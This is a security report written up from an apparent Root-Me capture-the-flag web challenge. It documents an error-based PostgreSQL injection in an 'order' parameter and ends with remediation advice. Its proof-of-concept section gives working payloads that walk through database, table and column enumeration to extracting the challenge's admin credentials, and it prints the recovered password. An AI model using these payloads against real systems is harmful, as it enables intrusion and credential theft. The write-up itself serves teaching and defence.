
---

# SECURITY REPORT

**Penetration Testing Report: Critical SQL Injection Vulnerability**

**Report Date:** 2026-03-01
**Auditor:** Senior Penetration Tester (20 Years Experience)
**Target:** [http://challenge01.root-me.org/web-serveur/ch34/](http://challenge01.root-me.org/web-serveur/ch34/)

---

## 1. Executive Summary

During a security assessment of the web application hosted at the target URL, a **critical SQL Injection vulnerability** was discovered in the `order` parameter of the GET request. This vulnerability allows an unauthenticated attacker to:

* Bypass authentication
* Exfiltrate sensitive user data (usernames, passwords, emails)
* Potentially modify or delete database records

**Business Impact:** If exploited in a production environment, this vulnerability could result in complete compromise of the application’s data confidentiality, integrity, and availability. Additionally, it exposes the organization to potential regulatory penalties, reputational damage, and financial loss.

**Overall Risk:** Critical (CVSS v3.1 Score: 9.8 / High likelihood of exploitation with severe impact).

---

## 2. Scope

**In-Scope:**

* Web application endpoints accessible publicly at the target URL
* Focused testing on HTTP GET parameters

**Out-of-Scope:**

* Network infrastructure outside the web application
* Third-party integrated services

---

## 3. Methodology

Testing was conducted following standard penetration testing methodologies including:

* **OWASP Testing Guide** (v4)
* **Penetration Testing Execution Standard (PTES)**
* Manual testing supported by custom scripts

The assessment included input validation testing, parameter fuzzing, and database interrogation using non-destructive error-based SQL injection techniques.

---

## 4. Vulnerability Technical Details

**Vulnerability Type:** SQL Injection (Inferential / Error-Based)
**Location:** `order` parameter in the GET request
**Database:** PostgreSQL

**Description:**

The web application does not properly sanitize user input in the `order` parameter, allowing an attacker to inject arbitrary SQL statements. By exploiting this, an attacker can enumerate databases, tables, and columns, and extract sensitive data.

---

### 4.1 Proof of Concept (PoC)

#### 4.1.1 Database Identification

**Request:**

```
GET /web-serveur/ch34/?action=contents&order=ASC, (select cast(current_database() as int)) HTTP/1.1
Host: challenge01.root-me.org
```

**Response Fragment:**

```
500 Internal Server Error
ERROR: invalid input syntax for integer: "c_webserveur_34"
```

**Result:** Database name identified as `c_webserveur_34`.

---

#### 4.1.2 Table Enumeration

**Request:**

```
GET /web-serveur/ch34/?action=contents&order=ASC, (select cast(string_agg(table_name, $$ , $$) as int) from information_schema.tables where table_schema=$$public$$)
```

**Response Fragment:**

```
500 Internal Server Error
ERROR: invalid input syntax for integer: "35t4bl3"
```

**Result:** Table discovered: `35t4bl3`.

---

#### 4.1.3 Column Enumeration

**Request:**

```
GET /web-serveur/ch34/?action=contents&order=ASC, (select cast(string_agg(column_name, $$ , $$) as int) from information_schema.columns where table_name='35t4bl3')
```

**Response Fragment:**

```
500 Internal Server Error
ERROR: invalid input syntax for integer: "id , n4m3_ , p455w0rd_ , em41l_"
```

**Result:** Columns identified: `id, n4m3_, p455w0rd_, em41l_`.

---

#### 4.1.4 Data Exfiltration

**Request:**

```
GET /web-serveur/ch34/?action=contents&order=ASC, (select cast(string_agg(n4m3_ || ':' || p455w0rd_, $$ | $$) as int) from 35t4bl3)
```

**Response Fragment:**

```
500 Internal Server Error
ERROR: invalid input syntax for integer: "admin:1a2BdKT"
```

**Result:** Administrative credentials retrieved: `admin:1a2BdKT`.

---

## 5. Impact Analysis

| Aspect          | Impact                                                            |
| --------------- | ----------------------------------------------------------------- |
| Confidentiality | Full access to user data, including credentials and emails        |
| Integrity       | Ability to modify or delete records in the database               |
| Availability    | Potential Denial of Service (DoS) through excessive database load |

**Business Consequences:**

* Exposure of sensitive user information
* Potential account takeover of administrative users
* Non-compliance with data protection regulations (e.g., GDPR)
* Reputational and financial damage in case of a public breach

---

## 6. Risk Rating

* **CVSS v3.1 Base Score:** 9.8 (Critical)
* **Attack Vector:** Network
* **Attack Complexity:** Low
* **Privileges Required:** None
* **User Interaction:** None
* **Scope:** Unchanged
* **Impact:** High on confidentiality, integrity, and availability

---

## 7. Recommendations / Remediation

**1. Use Prepared Statements**

* Replace all dynamic SQL concatenation with parameterized queries to prevent injection.

**2. Input Validation and Sanitization**

* Strictly validate and sanitize all client input on server-side.
* Reject any input that does not conform to expected types or format.

**3. Access Control**

* Limit database user privileges to prevent access to `information_schema` unless required.
* Ensure application runs with least privilege principle.

**4. Error Handling**

* Disable verbose SQL error messages in production to prevent leakage of database information.
* Implement custom error pages that do not reveal backend details.

**5. Monitoring & Logging**

* Monitor database queries for abnormal patterns.
* Log failed input attempts for anomaly detection.

**6. Security Awareness & Training**

* Ensure developers follow OWASP ASVS and secure coding practices.

**Priority:** Immediate (Critical vulnerability)

---

## 8. Conclusion

The SQL Injection vulnerability in the `order` parameter is **critical** and easily exploitable. Immediate remediation is required to protect sensitive data, maintain system integrity, and comply with regulatory requirements. Once fixed, a re-test should be conducted to confirm the vulnerability is fully mitigated.

---

